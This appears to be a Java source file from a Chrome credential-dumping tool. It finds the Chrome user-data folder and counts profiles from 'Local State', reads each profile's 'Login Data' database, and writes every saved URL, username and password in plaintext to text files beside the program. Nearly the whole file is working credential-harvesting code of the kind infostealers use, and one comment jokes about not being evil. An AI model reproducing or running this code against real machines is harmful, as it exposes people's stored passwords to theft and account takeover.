package me.matt.chrome.acc.util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import me.matt.chrome.acc.Application;
import me.matt.chrome.acc.exception.ChromeNotFoundException;
import me.matt.chrome.acc.exception.DatabaseConnectionException;
import me.matt.chrome.acc.exception.DatabaseReadException;
import me.matt.chrome.acc.wrappers.ChromeAccount;
import me.matt.chrome.acc.wrappers.ChromeDatabase;

public class Dumper {

    private Map<File, ChromeAccount[]> profiles;

    private Dumper(Map<File, ChromeAccount[]> profiles) {
        this.profiles = profiles;
    }

    public boolean saveToFile() throws IOException {
        for (File file : profiles.keySet()) {
            if (file.exists()) {
                file.delete(); // TODO: Let's not be evil??
            }
            file.getParentFile().mkdirs();
            file.createNewFile();
            ChromeAccount[] accounts = profiles.get(file);
            List<String> lines = new ArrayList<>();
            for (ChromeAccount account : accounts) {
                lines.add("URL: " + account.getURL());
                lines.add("Username: " + account.getUsername());
                lines.add("Password: " + account.getPassword());
                lines.add("");
            }
            lines.remove(lines.size() - 1);
            Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
        }

        return true;

    }

    public String getDumpLocation() {
        return profiles.keySet().iterator().next().getParent();
    }

    public int getDumpSize() {
        return profiles.values().stream().mapToInt(b -> b.length).sum();
    }

    public int getAmountOfProfiles() {
        return profiles.keySet().size();
    }

    public static Dumper dumpAccounts() throws DatabaseConnectionException,
            DatabaseReadException, IOException {
        Path chromeInstall = Paths.get(System.getProperty("user.home")
                + File.separator
                + "AppData\\Local\\Google\\Chrome\\User Data\\");

        File chromeInfo = new File(chromeInstall.toString(), "Local State");

        if (Files.notExists(chromeInstall)) {
            throw new ChromeNotFoundException(
                    "Google chrome intallation not found.");
        }

        int profileCount = 0;
        ArrayList<String> names = new ArrayList<>();
        BufferedReader br = new BufferedReader(new FileReader(chromeInfo));
        String line;
        while ((line = br.readLine()) != null) {
            if ((line.contains("Profile ") || line.contains("Default"))
                    && line.endsWith(": {")) {
                profileCount++;
            }
            line = line.trim();
            if (line.contains("\"name\":") && profileCount > names.size()) {
                names.add(line.substring(line.indexOf("\"", 6) + 1,
                        line.lastIndexOf("\"")));
            }
        }
        br.close();

        String location = Application.class.getProtectionDomain()
                .getCodeSource().getLocation().toString().replace("%20", " ")
                .replace("file:/", "");
        String main = location.substring(0, location.lastIndexOf('/') + 1)
                + "Accounts";

        HashMap<File, ChromeAccount[]> accounts = new HashMap<File, ChromeAccount[]>();
        for (int i = 0; i < profileCount; i++) {
            File loginData = new File(chromeInstall.toString() + File.separator
                    + (i > 0 ? "Profile " + i : "Default"), "Login Data");
            accounts.put(new File(main, "Accounts - " + names.get(i) + ".txt"),
                    readDatabase(loginData));
        }

        return new Dumper(accounts);
    }

    private static ChromeAccount[] readDatabase(File data)
            throws DatabaseConnectionException, DatabaseReadException {
        ChromeDatabase db = ChromeDatabase.connect(data);
        ArrayList<ChromeAccount> accounts = db.selectAccounts();
        db.close();
        return accounts.toArray(new ChromeAccount[] {});
    }
}
